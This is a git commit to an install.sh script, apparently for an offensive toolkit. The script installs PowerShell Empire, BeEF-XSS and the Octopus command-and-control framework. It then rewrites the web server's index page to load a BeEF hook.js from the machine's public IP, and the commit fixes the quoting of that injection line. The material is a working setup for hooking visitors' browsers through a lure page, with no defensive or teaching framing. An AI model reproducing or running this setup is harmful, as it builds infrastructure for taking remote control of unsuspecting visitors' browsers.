99c19fd266c2fd2853becb96380636a6221d98cc
Ahmed Saeed <ahmedsaeedramadan@yahoo.com>
2020-07-01 03:23:23 +0200

    edit beef inject
    edit beef inject

--- install.sh
+++ install.sh
@@ -7,5 +7,5 @@ apt update && sudo apt full-upgrade -y
 apt install powershell-empire beef-xss apache2 -y 
 apt update; apt install git -y; git clone https://github.com/mhaskar/Octopus/ /opt/Octopus; cd /opt/Octopus/; apt install python3-pip -y ; export LC_ALL=C ;  pip3 install -r requirements.txt;apt install mono-devel -y
 mv /var/www/html/index.html /var/www/html/index.html.bak
-echo "<script src="http://"$(host myip.opendns.com resolver1.opendns.com | grep "myip.opendns.com has" | awk '{print $4}')":3000/hook.js"></script>" >> /var/www/html/index.html
+echo "<script src=\"http://"$(host myip.opendns.com resolver1.opendns.com | grep "myip.opendns.com has" | awk '{print $4}')":3000/hook.js\"></script>" >> /var/www/html/index.html
 reboot
